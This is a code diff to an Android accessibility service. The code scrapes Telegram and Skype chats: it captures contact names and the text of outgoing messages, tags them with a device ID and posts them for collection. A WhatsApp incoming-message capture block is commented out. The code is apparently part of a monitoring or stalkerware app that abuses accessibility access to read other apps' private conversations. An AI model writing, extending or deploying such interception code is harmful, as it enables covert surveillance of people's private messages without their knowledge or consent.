@@ -76,11 +76,94 @@ public class MyAccessibilityService extends AccessibilityService {
                     PreferenceUtil.setTeleLastCount(0);
                 }
             }
-            if(accessibilityEvent.getContentDescription() != null && accessibilityEvent.getContentDescription().toString().split("\\.").length==3){
-                Chat chat = PreferenceUtil.getChat();
-                chat.setName(accessibilityEvent.getContentDescription().toString().split("\\.")[0]);
-                PreferenceUtil.setChat(chat);
-                Log.d(TAG, "Chat clicked");
+            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED &&
+                    accessibilityEvent.getContentDescription() != null &&
+                    accessibilityEvent.getContentDescription().toString().split("\\.").length>=3){
+                Chat chat = PreferenceUtil.getTelegramChat();
+
+                if(accessibilityEvent.getContentDescription().toString().split("\\.").length==3){
+                    chat.setName(accessibilityEvent.getContentDescription().toString().split("\\.")[0]);
+                }else{
+                    chat.setName(accessibilityEvent.getContentDescription().toString().split("\\.")[1]);
+                }
+                PreferenceUtil.setTelegramChat(chat);
+            }
+            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED &&
+                    accessibilityEvent.getContentDescription() != null &&
+                    accessibilityEvent.getContentDescription().toString().equals("Send")){
+                Chat chat = PreferenceUtil.getTelegramChat();
+                if(PreferenceUtil.getChat().getName()==null){
+                    chat.setName("unknown");
+                }
+                chat.setType("Keluar");
+                chat.setTime(utils.getCurrentTime());
+                PreferenceUtil.setTelegramChat(chat);
+                if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
+                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
+                    EventBus.getDefault().post(chat);
+                    chat =  PreferenceUtil.getTelegramChat();
+                    chat.setMessage(null);
+                    PreferenceUtil.setTelegramChat(chat);
+                }
+            }
+
+            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED &&
+                    accessibilityEvent.getText() != null &&
+                    !accessibilityEvent.getText().toString().isEmpty()){
+                Chat chat = PreferenceUtil.getTelegramChat();
+                chat.setName(accessibilityEvent.getText().toString());
+                PreferenceUtil.setTelegramChat(chat);
+            }
+        }
+
+
+        if(sourcePackageName!=null&&sourcePackageName.equals("com.skype.raider")){
+            if(accessibilityEvent.getClassName()!=null ){
+                if(accessibilityEvent.getClassName().toString().equals("com.skype4life.MainActivity")){
+                    PreferenceUtil.setSkypeChat(null);
+                    PreferenceUtil.setSkypeLastIncomingMessage("");
+                    PreferenceUtil.setSkypeLastCount(0);
+                }
+            }
+            if(accessibilityEvent.getSource()!=null&&accessibilityEvent.getSource().getChildCount()>=2&&
+                    accessibilityEvent.getSource().getChild(2).getContentDescription()!=null&&
+                    accessibilityEvent.getSource().getChild(2).getContentDescription().toString().split(",").length>3&&
+                    accessibilityEvent.getSource().getChild(2).getClassName().equals("android.widget.Button")){
+                Chat chat = PreferenceUtil.getSkypeChat();
+
+                chat.setName(accessibilityEvent.getSource().getChild(2).getContentDescription().toString().split(",")[0]);
+                PreferenceUtil.setSkypeChat(chat);
+            }
+
+            if(accessibilityEvent.getClassName() != null &&
+                    accessibilityEvent.getClassName().equals("android.widget.EditText")&&
+                    accessibilityEvent.getText() !=null&& !accessibilityEvent.getText().toString().isEmpty()){
+                Chat chat = PreferenceUtil.getSkypeChat();
+                chat.setMessage(accessibilityEvent.getText().toString());
+                PreferenceUtil.setSkypeChat(chat);
+            }
+
+            if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED&&
+                    accessibilityEvent.getClassName()!=null&&
+                    accessibilityEvent.getClassName().equals("android.widget.EditText")&&
+                    accessibilityEvent.getText()!=null&&
+                    accessibilityEvent.getText().equals("Type a message")){
+                Log.d(TAG, "enter");
+
+                Chat chat = PreferenceUtil.getSkypeChat();
+                if(PreferenceUtil.getChat().getName()==null){
+                    chat.setName("unknown");
+                }
+                chat.setType("Keluar");
+                chat.setTime(utils.getCurrentTime());
+                PreferenceUtil.setSkypeChat(chat);
+                if(!chat.getMessage().equals("Type a message")&& !chat.getMessage().equals("Voice note recorder")){
+                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
+                    EventBus.getDefault().post(chat);
+                    chat =  PreferenceUtil.getSkypeChat();
+                    chat.setMessage(null);
+                    PreferenceUtil.setSkypeChat(chat);
+                }
             }
         }
 
@@ -94,38 +177,38 @@ public class MyAccessibilityService extends AccessibilityService {
                     PreferenceUtil.setLastCount(0);
                 }
             }
-            if(sourcePackageName!=null && sourcePackageName.equals("com.whatsapp")){
-                if(accessibilityEvent.getClassName().equals("android.widget.ListView")){
-                    if(PreferenceUtil.getChat().getName()!=null&&!PreferenceUtil.getChat().getName().isEmpty()){
-                        AccessibilityNodeInfo source = accessibilityEvent.getSource();
-                        if(source!=null){
-                            if(PreferenceUtil.getLastIncomingMessage().isEmpty()){
-                                PreferenceUtil.setLastCount(getCount(source,getLastIncomingChat(source)));
-
-                                PreferenceUtil.setLastIncomingMessage(getLastIncomingChat(source));
-                            }else{
-                                if(isContainListChat(source,PreferenceUtil.getLastIncomingMessage())&&
-                                        !isRepeat(source, PreferenceUtil.getLastIncomingMessage())){
-                                    PreferenceUtil.setLastIncomingMessage(source.getChild(source.getChildCount()-1).getChild(0).getText().toString());
-                                    Chat chat = PreferenceUtil.getChat();
-                                    if(PreferenceUtil.getChat().getName()==null){
-                                        chat.setName("unknown");
-                                    }
-                                    chat.setMessage(source.getChild(source.getChildCount()-1).getChild(0).getText().toString());
-                                    chat.setType("Masuk");
-                                    chat.setTime(utils.getCurrentTime());
-                                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
-                                    EventBus.getDefault().post(chat);
-                                    chat =  PreferenceUtil.getChat();
-                                    chat.setMessage(null);
-                                    PreferenceUtil.setChat(chat);
-
-                                }
-                            }
-                        }
-                    }
-                }
-            }
+//            if(sourcePackageName!=null && sourcePackageName.equals("com.whatsapp")){
+//                if(accessibilityEvent.getClassName().equals("android.widget.ListView")){
+//                    if(PreferenceUtil.getChat().getName()!=null&&!PreferenceUtil.getChat().getName().isEmpty()){
+//                        AccessibilityNodeInfo source = accessibilityEvent.getSource();
+//                        if(source!=null){
+//                            if(PreferenceUtil.getLastIncomingMessage().isEmpty()){
+//                                PreferenceUtil.setLastCount(getCount(source,getLastIncomingChat(source)));
+//
+//                                PreferenceUtil.setLastIncomingMessage(getLastIncomingChat(source));
+//                            }else{
+//                                if(isContainListChat(source,PreferenceUtil.getLastIncomingMessage())&&
+//                                        !isRepeat(source, PreferenceUtil.getLastIncomingMessage())){
+//                                    PreferenceUtil.setLastIncomingMessage(source.getChild(source.getChildCount()-1).getChild(0).getText().toString());
+//                                    Chat chat = PreferenceUtil.getChat();
+//                                    if(PreferenceUtil.getChat().getName()==null){
+//                                        chat.setName("unknown");
+//                                    }
+//                                    chat.setMessage(source.getChild(source.getChildCount()-1).getChild(0).getText().toString());
+//                                    chat.setType("Masuk");
+//                                    chat.setTime(utils.getCurrentTime());
+//                                    chat.setMemberDeviceId(PreferenceUtil.getMemberDevice());
+//                                    EventBus.getDefault().post(chat);
+//                                    chat =  PreferenceUtil.getChat();
+//                                    chat.setMessage(null);
+//                                    PreferenceUtil.setChat(chat);
+//
+//                                }
+//                            }
+//                        }
+//                    }
+//                }
+//            }
             if(accessibilityEvent.getText().size() == 5){
                 Chat chat = PreferenceUtil.getChat();
                 chat.setName(accessibilityEvent.getText().get(2).toString());
